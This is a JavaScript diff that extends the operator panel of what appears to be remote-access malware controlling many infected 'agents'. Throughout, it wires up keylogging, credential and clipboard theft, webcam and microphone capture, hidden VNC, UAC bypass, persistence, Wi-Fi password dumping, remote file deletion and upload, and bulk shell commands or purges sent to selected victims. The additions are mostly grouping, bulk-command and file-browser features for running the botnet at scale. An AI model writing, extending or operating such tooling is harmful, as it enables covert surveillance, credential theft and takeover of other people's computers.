@@ -12,6 +12,8 @@
     control: false, downBtn: null, lastMove: 0,
     inPreview: false, sysTimer: null,
     thumbs: {}, screenUrl: null, editing: null,
+    groups: [], group: '', secs: new Map(), collapsed: new Set(),
+    fileSel: null, procList: [], procFilter: '',
   };
 
   const ICON = {
@@ -30,6 +32,8 @@
     file: '<svg viewBox="0 0 24 24"><path d="M6 3h8l4 4v14H6z"/><path d="M14 3v4h4"/></svg>',
     chev: '<svg viewBox="0 0 24 24"><path d="M9 6l6 6-6 6"/></svg>',
     up: '<svg viewBox="0 0 24 24"><path d="M12 20V5"/><path d="M6 11l6-6 6 6"/></svg>',
+    check: '<svg viewBox="0 0 24 24"><path d="M4 12l5 5L20 6"/></svg>',
+    close: '<svg viewBox="0 0 24 24"><path d="M6 6l12 12"/><path d="M18 6L6 18"/></svg>',
   };
 
   // ------------------------------------------------------------------
@@ -73,11 +77,65 @@
   }
 
   // ------------------------------------------------------------------
+  // groups
+  // ------------------------------------------------------------------
+  const GC = ['#6366f1', '#22c55e', '#f59e0b', '#ec4899', '#06b6d4',
+              '#a855f7', '#ef4444', '#84cc16', '#f97316', '#14b8a6'];
+
+  function groupColor(name) {
+    const hit = S.groups.find((g) => g.name === name);
+    if (hit && hit.color) return hit.color;
+    let h = 0;
+    for (let i = 0; i < name.length; i++) h = (h * 31 + name.charCodeAt(i)) >>> 0;
+    return GC[h % GC.length];
+  }
+
+  function groupInfo(name) {
+    return S.groups.find((g) => g.name === name) || { name, color: groupColor(name), count: 0, online: 0 };
+  }
+
+  function syncGroups(groups) {
+    if (!Array.isArray(groups)) return;
+    S.groups = groups;
+    if (S.group && !groups.some((g) => g.name === S.group)) S.group = '';
+    renderGroupBar();
+    renderBulkTargets();
+    renderGroups();
+    render();
+  }
+
+  function renderGroupBar() {
+    const bar = $('#groupBar');
+    if (!bar) return;
+    const total = S.agents.length;
+    const online = S.agents.filter((a) => a.online).length;
+    let html = `<button class="gchip ${S.group ? '' : 'on'}" data-grp="">
+        <i style="background:#7b879e"></i><b>all</b><span>${online}/${total}</span></button>`;
+    for (const g of S.groups) {
+      html += `<button class="gchip ${S.group === g.name ? 'on' : ''}" data-grp="${esc(g.name)}">
+        <i style="background:${esc(g.color)}"></i><b>${esc(g.name)}</b>
+        <span>${g.online || 0}/${g.count || 0}</span></button>`;
+    }
+    const ungrouped = S.agents.filter((a) => !a.grp).length;
+    if (ungrouped) {
+      html += `<button class="gchip ${S.group === '__none' ? 'on' : ''}" data-grp="__none">
+        <i style="background:#4b566c"></i><b>ungrouped</b><span>${ungrouped}</span></button>`;
+    }
+    bar.innerHTML = html;
+  }
+
+  function renderBulkTargets() {
+    const list = $('#bulkGrpList');
+    if (list) list.innerHTML = S.groups.map((g) => `<option value="${esc(g.name)}">`).join('');
+  }
+
+  // ------------------------------------------------------------------
   // cards
   // ------------------------------------------------------------------
   function sig(a) {
     return [a.host, a.user, a.id, a.ip, a.os_short, a.arch, a.monitors, a.cpu, a.ram,
-            a.admin, a.cc, a.ver, a.nickname, a.grp, a.note, a.pinned].join('|');
+            a.admin, a.cc, a.ver, a.nickname, a.grp, a.grp ? groupColor(a.grp) : '',
+            a.note, a.pinned].join('|');
   }
 
   function cardHTML(a) {
@@ -87,6 +145,7 @@
         ${online ? `<img src="/api/agents/${a.id}/preview.jpg?n=${a.frame}" alt="">` : ''}
         <div class="ghost">${online ? '' : 'offline'}</div>
         <div class="thumb-actions">
+          <button data-act="pick" class="${S.selection.has(a.id) ? 'on' : ''}" title="select">${ICON.check}</button>
           <button data-act="pin" class="${a.pinned ? 'on' : ''}" title="pin">${ICON.star}</button>
           <button data-act="menu" title="edit client">${ICON.dots}</button>
         </div>
@@ -100,7 +159,7 @@
         <div class="row title">
           <span class="flag">${esc(a.cc || '??')}</span>
           <b>${esc(a.nickname || a.host || 'unknown')}</b>
-          ${a.grp ? `<span class="badge grp">${esc(a.grp)}</span>` : ''}
+          ${a.grp ? `<span class="badge grp" style="border-color:${esc(groupColor(a.grp))};color:${esc(groupColor(a.grp))}">${esc(a.grp)}</span>` : ''}
           ${a.admin ? '<span class="badge">admin</span>' : ''}
           ${ICON.shield}
         </div>
@@ -147,7 +206,6 @@
       el.dataset.id = a.id;
       el.innerHTML = cardHTML(a);
       el._sig = s;
-      $('#grid').appendChild(el);
       S.els.set(a.id, el);
     } else if (el._sig !== s) {
       el.innerHTML = cardHTML(a);
@@ -166,14 +224,18 @@
       ping.className = 'ping ' + pingClass(a.ping);
       ping.innerHTML = ICON.mouse + fmtPing(a.ping);
     }
+    const pick = el.querySelector('[data-act="pick"]');
+    if (pick) pick.classList.toggle('on', S.selection.has(a.id));
   }
 
   function applyFilter(list) {
     const q = $('#q').value.trim().toLowerCase();
     return list.filter((a) => {
       if (S.onlineOnly && !a.online) return false;
+      if (S.group === '__none' && a.grp) return false;
+      if (S.group && S.group !== '__none' && a.grp !== S.group) return false;
       if (!q) return true;
-      return [a.host, a.user, a.id, a.ip, a.os_short, a.cpu, a.nickname, a.grp].join(' ').toLowerCase().includes(q);
+      return [a.host, a.user, a.id, a.ip, a.os_short, a.cpu, a.nickname, a.grp, a.note].join(' ').toLowerCase().includes(q);
     });
   }
 
@@ -196,21 +258,67 @@
       if (!seen.has(id)) { el.remove(); S.els.delete(id); }
     }
 
-    // preserve order
-    const grid = $('#grid');
-    visible.forEach((a) => {
-      const el = S.els.get(a.id);
-      if (el && grid.lastElementChild !== el) { /* order handled below */ }
+    const board = $('#board');
+    const buckets = new Map();
+    for (const a of visible) {
+      const key = a.grp || '__none';
+      if (!buckets.has(key)) buckets.set(key, []);
+      buckets.get(key).push(a);
+    }
+
+    const keys = [...buckets.keys()].sort((x, y) => {
+      if (x === '__none') return 1;
+      if (y === '__none') return -1;
+      return x.localeCompare(y);
     });
-    visible.forEach((a) => grid.appendChild(S.els.get(a.id)));
+
+    const live = new Set(keys);
+    for (const [key, sec] of S.secs) {
+      if (!live.has(key)) { sec.remove(); S.secs.delete(key); }
+    }
+
+    for (const key of keys) {
+      let sec = S.secs.get(key);
+      if (!sec) {
+        sec = document.createElement('section');
+        sec.className = 'gsec';
+        sec.dataset.grp = key;
+        sec.innerHTML = `<header class="ghead"><i></i><b></b><span class="gcount"></span><span class="gchev">${ICON.chev}</span></header><div class="grid"></div>`;
+        S.secs.set(key, sec);
+      }
+      sec.classList.toggle('collapsed', S.collapsed.has(key));
+      const name = key === '__none' ? 'ungrouped' : key;
+      const info = key === '__none' ? { color: '#4b566c' } : groupInfo(key);
+      const members = buckets.get(key);
+      sec.querySelector('.ghead i').style.background = info.color || '#4b566c';
+      sec.querySelector('.ghead b').textContent = name;
+      sec.querySelector('.gcount').textContent =
+        `${members.filter((a) => a.online).length}/${members.length}`;
+      board.appendChild(sec);
+      const grid = sec.querySelector('.grid');
+      for (const a of members) grid.appendChild(S.els.get(a.id));
+    }
 
     $('#empty').classList.toggle('hidden', S.agents.length > 0);
+    renderBulkState();
+  }
+
+  function renderBulkState() {
+    const n = S.selection.size;
+    const bar = $('#bulkBar');
+    if (bar) bar.classList.toggle('hidden', n === 0);
+    const count = $('#bulkCount');
+    if (count) count.textContent = n + ' selected';
   }
 
   async function loadState() {
     try {
       const data = await api('/api/state');
       S.agents = data.agents;
+      if (data.groups) S.groups = data.groups;
+      renderGroupBar();
+      renderBulkTargets();
+      renderGroups();
       render();
     } catch {}
   }
@@ -253,6 +361,11 @@
     $('#audioWrap').innerHTML = '';
     $('#screenImg').removeAttribute('src');
     $('#screenEmpty').classList.remove('hidden');
+    $('#procList').innerHTML = '';
+    $('#procHint').textContent = '—';
+    S.fileSel = null;
+    S.procList = [];
+    S.procFilter = '';
     setControl(false, true);
 
     term(`session ${a.host} · ${a.online ? 'live' : 'offline'}`, 'sys');
@@ -286,7 +399,7 @@
     $$('.pane').forEach((p) => p.classList.toggle('active', p.id === 'pane-' + name));
     if (name === 'screen') { showScreen(); enterPreview(); }
     else leavePreview();
-    if (name === 'system') startSysPoll();
+    if (name === 'system') { startSysPoll(); loadProcs(); }
     else stopSysPoll();
   }
 
@@ -370,7 +483,9 @@
     if (['creds', 'clipper', 'webcam'].includes(module)) return $('#spyOut');
     if (['netscan', 'socks', 'hosts', 'hvnc', 'flip', 'shellui', 'cdtray',
          'openurl', 'shred', 'uac', 'update', 'persist', 'inputlock',
-         'overlay'].includes(module)) return $('#toolOut');
+         'overlay', 'env', 'wallpaper', 'wol', 'wifi', 'services', 'software',
+         'startup', 'registry', 'tasks', 'net', 'search', 'kill',
+         'drives'].includes(module)) return $('#toolOut');
     return null;
   }
 
@@ -494,6 +609,31 @@
       </div>`).join('') || '<div class="procrow"><span class="nm">idle</span></div>';
   }
 
+  function renderProcList() {
+    const box = $('#procList');
+    if (!box) return;
+    const q = S.procFilter.toLowerCase();
+    const list = S.procList.filter((p) =>
+      !q || `${p.name || ''} ${p.pid || ''} ${p.path || ''}`.toLowerCase().includes(q));
+    const hint = $('#procHint');
+    if (hint) hint.textContent = `${S.procList.length} total` + (q ? ` · ${list.length} match` : '');
+    box.innerHTML = list.slice(0, 900).map((p) => `
+      <div class="procrow" data-pid="${p.pid}" data-name="${esc(p.name)}">
+        <span class="nm">${esc(p.name)}</span>
+        <span class="pid">${p.pid}</span>
+        <span class="ram">${bytes(p.ws)}</span>
+        <span class="pth" title="${esc(p.path || '')}">${esc(p.path || '')}</span>
+        <span class="kill">kill</span>
+      </div>`).join('') || '<div class="procrow"><span class="nm">no match</span></div>';
+  }
+
+  function loadProcs() {
+    if (!S.sel) return;
+    const a = agentById(S.sel);
+    if (!a || !a.online) return;
+    sendSilent('ps', {});
+  }
+
   function wireSysProcs() {
     $('#sysProcs').addEventListener('click', (e) => {
       const row = e.target.closest('.procrow');
@@ -502,6 +642,24 @@
       const name = row.dataset.name || String(pid);
       if (!confirm(`kill ${name} (pid ${pid})?`)) return;
       run('kill', { pid }, `kill ${name} (${pid})`);
+    });
+
+    const list = $('#procList');
+    if (list) {
+      list.addEventListener('click', (e) => {
+        const row = e.target.closest('.procrow');
+        if (!row || !row.dataset.pid) return;
+        const pid = +row.dataset.pid;
+        const name = row.dataset.name || String(pid);
+        if (!confirm(`kill ${name} (pid ${pid})?`)) return;
+        run('kill', { pid }, `kill ${name} (${pid})`);
+      });
+    }
+
+    $('#procRefresh')?.addEventListener('click', loadProcs);
+    $('#procSearch')?.addEventListener('input', (e) => {
+      S.procFilter = e.target.value.trim();
+      renderProcList();
     });
   }
 
@@ -548,8 +706,46 @@
   // ------------------------------------------------------------------
   // files
   // ------------------------------------------------------------------
+  function targetDir() {
+    const typed = ($('#fPath').value || '').trim();
+    if (typed) return typed.replace(/[\\/]+$/, '');
+    return (S.cwd || '').replace(/[\\/]+$/, '');
+  }
+
+  function joinPath(dir, name) {
+    if (!dir) return name;
+    const sep = dir.includes('/') && !dir.includes('\\') ? '/' : '\\';
+    return dir.replace(/[\\/]+$/, '') + sep + name;
+  }
+
+  function parentPath(p) {
+    if (!p) return '';
+    const norm = p.replace(/[\\/]+$/, '');
+    if (/^[a-zA-Z]:$/.test(norm)) return '';
+    const idx = Math.max(norm.lastIndexOf('\\'), norm.lastIndexOf('/'));
+    if (idx < 0) return '';
+    const parent = norm.slice(0, idx);
+    return /^[a-zA-Z]:$/.test(parent) ? parent + '\\' : parent;
+  }
+
+  function setCwd(p) {
+    S.cwd = p || '';
+    const path = $('#fPath');
+    if (path) path.value = S.cwd;
+  }
+
+  function selectFile(entry, row) {
+    S.fileSel = entry;
+    $$('#ftree .node.sel').forEach((n) => n.classList.remove('sel'));
+    if (row) row.classList.add('sel');
+    const hint = $('#fHint');
+    if (hint) hint.textContent = entry ? `selected ${entry.name}` : 'double-click a file to download · click to select';
+  }
+
   async function loadDrives() {
     const tree = $('#ftree');
+    setCwd('');
+    selectFile(null, null);
     tree.innerHTML = '<div class="node"><span class="nm">loading drives…</span></div>';
     try {
       const r = await api(`/api/agents/${encodeURIComponent(S.sel)}/cmd`, {
@@ -571,6 +767,19 @@
       const node = makeNode({ name: d.name, path: d.name, dir: true, free: d.free, total: d.total }, true);
       tree.appendChild(node);
     }
+  }
+
+  function openListing(path) {
+    if (!S.sel) return;
+    setCwd(path);
+    selectFile(null, null);
+    const box = $('#ftree');
+    box.innerHTML = '<div class="node"><span class="nm">loading…</span></div>';
+    api(`/api/agents/${encodeURIComponent(S.sel)}/cmd`, {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ module: 'ls', args: { path } }),
+    }).then((r) => S.pending.set(r.id, { module: 'ls', target: box }))
+      .catch((e) => { box.innerHTML = `<div class="node"><span class="nm">${esc(e.message)}</span></div>`; });
   }
 
   function makeNode(entry, isRoot = false) {
@@ -595,6 +804,8 @@
 
       row.addEventListener('click', async (ev) => {
         ev.stopPropagation();
+        setCwd(entry.path);
+        selectFile(null, null);
         if (row.dataset.loaded === '1') {
           kids.classList.toggle('hidden');
           row.classList.toggle('open');
@@ -617,7 +828,22 @@
         }
       });
     } else {
-      row.addEventListener('click', () => {
+      row.addEventListener('click', (ev) => {
+        ev.stopPropagation();
+        selectFile(entry, row);
+        const parent = parentPath(entry.path);
+        if (parent) {
+          const p = $('#fPath');
+          if (p && (!p.value || !entry.path.startsWith(p.value))) p.value = parent;
+        }
+      });
+      row.addEventListener('dblclick', (ev) => {
+        ev.stopPropagation();
+        term(`download ${entry.path}`, 'cmd');
+        run('download', { path: entry.path });
+      });
+      row.querySelector('.go')?.addEventListener('click', (ev) => {
+        ev.stopPropagation();
         term(`download ${entry.path}`, 'cmd');
         run('download', { path: entry.path });
       });
@@ -635,6 +861,60 @@
     const dirs = entries.filter((e) => e.dir).sort((a, b) => a.name.localeCompare(b.name));
     const files = entries.filter((e) => !e.dir).sort((a, b) => a.name.localeCompare(b.name));
     for (const e of [...dirs, ...files]) container.appendChild(makeNode(e));
+  }
+
+  // file operations ---------------------------------------------------
+  function promptName(title, value = '') {
+    const v = prompt(title, value);
+    return v == null ? null : v.trim();
+  }
+
+  async function fileOp(module, args, label) {
+    if (!S.sel) return;
+    try {
+      const { id } = await api(`/api/agents/${encodeURIComponent(S.sel)}/cmd`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ module, args }),
+      });
+      S.pending.set(id, { module, label, refreshFiles: true });
+      term(label, 'cmd');
+    } catch (e) { term(e.message, 'err'); }
+  }
+
+  function wireFileOps() {
+    $('#fUp')?.addEventListener('click', () => {
+      const cur = targetDir();
+      const up = parentPath(cur);
+      if (!up) loadDrives();
+      else openListing(up);
+    });
+
+    $('#fUpload')?.addEventListener('click', () => $('#filePicker').click());
+
+    $('#fMkdir')?.addEventListener('click', () => {
+      const name = promptName('new folder name');
+      if (!name) return;
+      const dir = targetDir() || 'C:\\Users\\Public';
+      fileOp('mkdir', { path: joinPath(dir, name) }, `mkdir ${joinPath(dir, name)}`);
+    });
+
+    $('#fRename')?.addEventListener('click', () => {
+      if (!S.fileSel) return toast('select a file first');
+      const name = promptName('rename to', S.fileSel.name);
+      if (!name || name === S.fileSel.name) return;
+      const parent = parentPath(S.fileSel.path) || targetDir();
+      const dest = joinPath(parent, name);
+      fileOp('mv', { path: S.fileSel.path, dest }, `rename ${S.fileSel.name} -> ${name}`);
+      selectFile(null, null);
+    });
+
+    $('#fDelete')?.addEventListener('click', () => {
+      if (!S.fileSel) return toast('select a file first');
+      const entry = S.fileSel;
+      if (!confirm(`delete ${entry.dir ? 'folder' : 'file'} ${entry.path}?`)) return;
+      fileOp('rm', { path: entry.path, recursive: !!entry.dir }, `delete ${entry.path}`);
+      selectFile(null, null);
+    });
   }
 
   // ------------------------------------------------------------------
@@ -709,10 +989,11 @@
         S.sort = S.sort === 'host' ? 'online' : S.sort === 'online' ? 'ping' : 'host';
         toast('sort: ' + S.sort); render();
       }
+      if (t === 'groups') { openGroupManager(); return; }
       if (t === 'select') { applyFilter(S.agents).forEach((a) => S.selection.add(a.id)); render(); }
       if (t === 'clear') { S.selection.clear(); render(); }
-      if (t === 'list') { S.view = 'list'; $('#grid').classList.add('list'); $$('.tbtn[data-tool="list"]').forEach(x=>x.classList.add('active')); $$('.tbtn[data-tool="grid"]').forEach(x=>x.classList.remove('active')); }
-      if (t === 'grid') { S.view = 'grid'; $('#grid').classList.remove('list'); $$('.tbtn[data-tool="grid"]').forEach(x=>x.classList.add('active')); $$('.tbtn[data-tool="list"]').forEach(x=>x.classList.remove('active')); }
+      if (t === 'list') { S.view = 'list'; $('#board').classList.add('list'); $$('.tbtn[data-tool="list"]').forEach(x=>x.classList.add('active')); $$('.tbtn[data-tool="grid"]').forEach(x=>x.classList.remove('active')); }
+      if (t === 'grid') { S.view = 'grid'; $('#board').classList.remove('list'); $$('.tbtn[data-tool="grid"]').forEach(x=>x.classList.add('active')); $$('.tbtn[data-tool="list"]').forEach(x=>x.classList.remove('active')); }
       if (t === 'power') {
         const ids = S.selection.size ? [...S.selection] : (S.sel ? [S.sel] : []);
         if (!ids.length) return toast('select an agent first');
@@ -730,30 +1011,57 @@
     }));
 
     $('#q').addEventListener('input', render);
+    $('#groupBar').addEventListener('click', (e) => {
+      const b = e.target.closest('[data-grp]');
+      if (!b) return;
+      S.group = b.dataset.grp;
+      renderGroupBar();
+      render();
+    });
     $('#mClose').addEventListener('click', closeModal);
     $('#modal').addEventListener('click', (e) => { if (e.target.id === 'modal') closeModal(); });
     document.addEventListener('keydown', (e) => {
       if (e.key === 'Escape') {
         $('#lightbox').classList.add('hidden');
-        if (!$('#clientModal').classList.contains('hidden')) closeClientEditor();
+        if (!$('#groupModal').classList.contains('hidden')) closeGroupManager();
+        else if (!$('#clientModal').classList.contains('hidden')) closeClientEditor();
         else if (!$('#modal').classList.contains('hidden')) closeModal();
       }
     });
     $('#lightbox').addEventListener('click', () => $('#lightbox').classList.add('hidden'));
   }
 
+  function toggleSelect(id) {
+    if (S.selection.has(id)) S.selection.delete(id);
+    else S.selection.add(id);
+    render();
+  }
+
   function wireGrid() {
-    $('#grid').addEventListener('click', (e) => {
+    $('#board').addEventListener('click', (e) => {
+      const head = e.target.closest('.ghead');
+      if (head) {
+        const sec = head.closest('.gsec');
+        if (!sec) return;
+        const key = sec.dataset.grp;
+        if (S.collapsed.has(key)) S.collapsed.delete(key);
+        else S.collapsed.add(key);
+        sec.classList.toggle('collapsed', S.collapsed.has(key));
+        return;
+      }
       const card = e.target.closest('.card');
       if (!card) return;
       const id = card.dataset.id;
       const act = e.target.closest('[data-act]')?.dataset.act;
 
+      if (act === 'pick') return toggleSelect(id);
       if (act === 'open') return openAgent(id);
       if (act === 'screen') { openAgent(id).then(() => switchPane('screen')); return; }
       if (act === 'mic') {
-        S.sel = id;
-        run('mic', { seconds: 10 }, 'recording microphone 10s');
+        openAgent(id).then(() => {
+          switchPane('media');
+          run('mic', { seconds: 10 }, 'recording microphone 10s');
+        });
         return;
       }
       if (act === 'pin') {
@@ -771,12 +1079,8 @@
       }
       if (act === 'menu') { openClientEditor(id); return; }
 
-      if (S.selection.size) {
-        S.selection.has(id) ? S.selection.delete(id) : S.selection.add(id);
-        render();
-      } else {
-        openAgent(id);
-      }
+      if (e.ctrlKey || e.metaKey || e.shiftKey) toggleSelect(id);
+      else openAgent(id);
     });
   }
 
@@ -848,7 +1152,10 @@
     $('#ceGrp').value = a.grp || '';
     $('#ceNote').value = a.note || '';
     $('#cePin').checked = !!a.pinned;
-    const groups = [...new Set(S.agents.map((x) => x.grp).filter(Boolean))];
+    const groups = [...new Set([
+      ...S.groups.map((g) => g.name),
+      ...S.agents.map((x) => x.grp).filter(Boolean),
+    ])];
     $('#ceGrpList').innerHTML = groups.map((g) => `<option value="${esc(g)}">`).join('');
     $('#clientModal').classList.remove('hidden');
     $('#ceNick').focus();
@@ -878,6 +1185,156 @@
     $('#ceSave').addEventListener('click', saveClientEditor);
     $('#clientModal').addEventListener('click', (e) => { if (e.target.id === 'clientModal') closeClientEditor(); });
     $('#ceNick').addEventListener('keydown', (e) => { if (e.key === 'Enter') { e.preventDefault(); saveClientEditor(); } });
+  }
+
+  // ------------------------------------------------------------------
+  // group manager + bulk actions
+  // ------------------------------------------------------------------
+  function renderGroups() {
+    const list = $('#gmList');
+    if (!list) return;
+    if (!S.groups.length) {
+      list.innerHTML = '<div class="gmempty">no groups yet — create one above</div>';
+      return;
+    }
+    list.innerHTML = S.groups.map((g) => `
+      <div class="gmrow" data-g="${esc(g.name)}">
+        <input type="color" class="gmcolor" value="${esc(g.color)}" title="color">
+        <span class="gmname">${esc(g.name)}</span>
+        <span class="gmcount">${g.online || 0}/${g.count || 0}</span>
+        <button class="btn small" data-gm="filter">show</button>
+        <button class="btn small" data-gm="rename">rename</button>
+        <button class="btn small danger" data-gm="delete">delete</button>
+      </div>`).join('');
+  }
+
+  function openGroupManager() {
+    renderGroups();
+    $('#groupModal').classList.remove('hidden');
+    $('#gmName').focus();
+  }
+
+  function closeGroupManager() {
+    $('#groupModal').classList.add('hidden');
+  }
+
+  async function groupCall(path, method, body) {
+    try {
+      const r = await api(path, {
+        method,
+        headers: { 'Content-Type': 'application/json' },
+        body: body === undefined ? undefined : JSON.stringify(body),
+      });
+      if (r && r.groups) syncGroups(r.groups);
+      return r;
+    } catch (e) { toast(e.message); return null; }
+  }
+
+  async function createGroup() {
+    const name = $('#gmName').value.trim();
+    if (!name) return toast('group name required');
+    const color = $('#gmColor').value || '#6366f1';
+    const r = await groupCall('/api/groups', 'POST', { name, color });
+    if (r) {
+      $('#gmName').value = '';
+      toast('group created');
+    }
+  }
+
+  function wireGroupManager() {
+    $('#gmClose').addEventListener('click', closeGroupManager);
+    $('#groupModal').addEventListener('click', (e) => {
+      if (e.target.id === 'groupModal') closeGroupManager();
+    });
+    $('#gmAdd').addEventListener('click', createGroup);
+    $('#gmName').addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') { e.preventDefault(); createGroup(); }
+    });
+
+    $('#gmList').addEventListener('click', async (e) => {
+      const row = e.target.closest('.gmrow');
+      if (!row) return;
+      const name = row.dataset.g;
+      const act = e.target.closest('[data-gm]')?.dataset.gm;
+      if (!act) return;
+      if (act === 'filter') {
+        S.group = name;
+        closeGroupManager();
+        renderGroupBar();
+        render();
+      }
+      if (act === 'rename') {
+        const next = promptName(`rename group "${name}"`, name);
+        if (!next || next === name) return;
+        await groupCall(`/api/groups/${encodeURIComponent(name)}`, 'PATCH', { name: next });
+        if (S.group === name) S.group = next;
+        renderGroupBar();
+        render();
+      }
+      if (act === 'delete') {
+        if (!confirm(`delete group "${name}"? members become ungrouped`)) return;
+        await groupCall(`/api/groups/${encodeURIComponent(name)}`, 'DELETE');
+        if (S.group === name) S.group = '';
+        renderGroupBar();
+        render();
+      }
+    });
+
+    $('#gmList').addEventListener('change', async (e) => {
+      const row = e.target.closest('.gmrow');
+      const color = e.target.closest('.gmcolor');
+      if (!row || !color) return;
+      await groupCall(`/api/groups/${encodeURIComponent(row.dataset.g)}`, 'PATCH',
+        { color: color.value });
+    });
+  }
+
+  function wireBulk() {
+    const bar = $('#bulkBar');
+    if (!bar) return;
+    bar.addEventListener('click', async (e) => {
+      const act = e.target.closest('[data-bulk]')?.dataset.bulk;
+      if (!act) return;
+      const ids = [...S.selection];
+      if (act === 'clear') { S.selection.clear(); render(); return; }
+      if (!ids.length) return toast('nothing selected');
+
+      const body = { ids };
+      if (act === 'assign') {
+        const grp = $('#bulkGrp').value.trim();
+        if (!grp) return toast('type a group name');
+        body.grp = grp;
+      }
+      if (act === 'ungroup') body.grp = '';
+      if (act === 'pin') body.pinned = true;
+      if (act === 'unpin') body.pinned = false;
+      if (act === 'cmd') {
+        const cmd = prompt(`shell command for ${ids.length} agent(s)`);
+        if (!cmd || !cmd.trim()) return;
+        body.action = 'cmd';
+        body.module = 'shell';
+        body.args = { cmd: cmd.trim() };
+      }
+      if (act === 'exit') {
+        if (!confirm(`terminate ${ids.length} agent(s)?`)) return;
+        body.action = 'exit';
+      }
+      if (act === 'purge') {
+        if (!confirm(`purge ${ids.length} agent(s) and all their data?`)) return;
+        body.action = 'purge';
+      }
+
+      try {
+        await api('/api/bulk', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(body),
+        });
+        toast(act === 'assign' || act === 'ungroup' ? 'group updated' : 'sent');
+        if (act === 'purge') S.selection.clear();
+        await loadState();
+      } catch (err) { toast(err.message); }
+    });
   }
 
   function wireScreenControls() {
@@ -1007,19 +1464,13 @@
     $('#fGo').addEventListener('click', () => {
       const p = $('#fPath').value.trim();
       if (!p || !S.sel) return;
-      S.cwd = p;
-      const box = $('#ftree');
-      box.innerHTML = '<div class="node"><span class="nm">loading…</span></div>';
-      api(`/api/agents/${encodeURIComponent(S.sel)}/cmd`, {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ module: 'ls', args: { path: p } }),
-      }).then((r) => S.pending.set(r.id, { module: 'ls', target: box }));
+      openListing(p);
     });
     $('#fPath').addEventListener('keydown', (e) => { if (e.key === 'Enter') { e.preventDefault(); $('#fGo').click(); } });
-    $('#fHome').addEventListener('click', () => { $('#fPath').value = ''; loadDrives(); });
+    $('#fHome').addEventListener('click', () => { setCwd(''); loadDrives(); });
     $('#fRefresh').addEventListener('click', () => {
-      const p = $('#fPath').value.trim();
-      if (p) $('#fGo').click(); else loadDrives();
+      const p = targetDir();
+      if (p) openListing(p); else loadDrives();
     });
 
     $('#modal').addEventListener('click', (e) => {
@@ -1057,6 +1508,11 @@
       if (act === 'key-dump') run('keylog', { action: 'dump' }, 'keylog dump');
       if (act === 'key-clear') {
         $('#keyOut').textContent = '';
+        if (S.sel) {
+          api(`/api/agents/${encodeURIComponent(S.sel)}/keylogs`, { method: 'DELETE' })
+            .then(() => toast('keylog cleared'))
+            .catch(() => {});
+        }
         run('keylog', { action: 'clear' }, 'keylog clear');
       }
 
@@ -1123,6 +1579,23 @@
       if (act === 'hvnc-list') run('hvnc', { action: 'list' }, 'hvnc list');
       if (act === 'hvnc-capture') run('hvnc', { action: 'capture', index: 0 }, 'hvnc capture');
       if (act === 'hvnc-close') run('hvnc', { action: 'close' }, 'hvnc close');
+
+      // ---- new utilities ---------------------------------------------
+      if (act === 'env-dump') run('env', { filter: $('#envFilter').value.trim() }, 'environment');
+      if (act === 'wall-set') run('wallpaper', {
+        action: 'set', path: $('#wallPath').value.trim(),
+        style: $('#wallStyle').value,
+      }, 'set wallpaper');
+      if (act === 'wall-get') run('wallpaper', { action: 'get' }, 'read wallpaper');
+      if (act === 'wall-clear') run('wallpaper', { action: 'clear' }, 'clear wallpaper');
+      if (act === 'wifi-profiles') run('wifi', { action: 'profiles' }, 'wifi profiles');
+      if (act === 'wifi-passwords') run('wifi', { action: 'allpasswords' }, 'wifi passwords');
+      if (act === 'wifi-password') run('wifi', {
+        action: 'password', name: $('#wifiSsid').value.trim(),
+      }, 'wifi password');
+      if (act === 'wol') run('wol', {
+        mac: $('#wolMac').value.trim(), broadcast: $('#wolBcast').value.trim(),
+      }, 'wake-on-lan');
     });
 
     ['#pvFps', '#pvQuality', '#pvWidth', '#pvMonitor'].forEach((sel) => {
@@ -1136,8 +1609,10 @@
       const file = ev.target.files[0];
       ev.target.value = '';
       if (!file || !S.sel) return;
-      const remote = prompt('remote path', 'C:\\Users\\Public\\' + file.name);
-      if (!remote) return;
+      const dir = targetDir() || 'C:\\Users\\Public';
+      const name = prompt('remote filename', file.name);
+      if (!name) return;
+      const remote = joinPath(dir, name);
       const fd = new FormData();
       fd.append('path', remote);
       fd.append('file', file);
@@ -1145,6 +1620,11 @@
       try {
         const r = await api(`/api/agents/${encodeURIComponent(S.sel)}/upload`, { method: 'POST', body: fd });
         term(`queued ${r.chunks} chunk(s) · ${bytes(r.size)}`, 'sys');
+        // chunks drain in order, so give the agent a moment then re-list
+        setTimeout(() => {
+          const cur = targetDir();
+          if (cur) openListing(cur); else loadDrives();
+        }, 600 + r.chunks * 120);
       } catch (e) { term(e.message, 'err'); }
     });
   }
@@ -1202,6 +1682,12 @@
   // ------------------------------------------------------------------
   // websocket
   // ------------------------------------------------------------------
+  let refreshTimer = null;
+  function scheduleRefresh() {
+    clearTimeout(refreshTimer);
+    refreshTimer = setTimeout(loadState, 180);
+  }
+
   function connect() {
     const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
     const ws = new WebSocket(`${proto}//${location.host}/panel/ws`);
@@ -1215,10 +1701,15 @@
       let m;
       try { m = JSON.parse(ev.data); } catch { return; }
 
+      if (m.t === 'groups') { syncGroups(m.groups); return; }
+      if (m.t === 'refresh') { scheduleRefresh(); return; }
+
       if (m.t === 'agent') {
         const a = m.agent;
         if (a.removed) {
           S.agents = S.agents.filter((x) => x.id !== a.id);
+          S.selection.delete(a.id);
+          if (S.sel === a.id) closeModal();
           render();
           return;
         }
@@ -1254,7 +1745,10 @@
 
         if (p?.module === 'ls') {
           const meta = m.body?.meta;
-          if (p.target && meta?.entries) renderListing(p.target, meta.entries);
+          if (p.target && meta?.entries) {
+            renderListing(p.target, meta.entries);
+            if (p.target.id === 'ftree' && meta.path) setCwd(meta.path);
+          }
           return;
         }
         if (p?.module === 'drives') {
@@ -1262,7 +1756,15 @@
           return;
         }
         if (p?.module === 'upload') return;
+        if (p?.refreshFiles) {
+          setTimeout(() => {
+            const cur = targetDir();
+            if (cur) openListing(cur); else loadDrives();
+          }, 500);
+        }
         const mod = p?.module || m.module;
+        if (mod === 'ps') { S.procList = (m.body?.meta?.processes || []); renderProcList(); return; }
+        if (mod === 'upload') return;
         if (mod === 'sysstat') { renderSysStat(m.body?.meta); return; }
         if (!p && (mod === 'input' || mod === 'preview')) return;
         renderBody(m.body, mod);
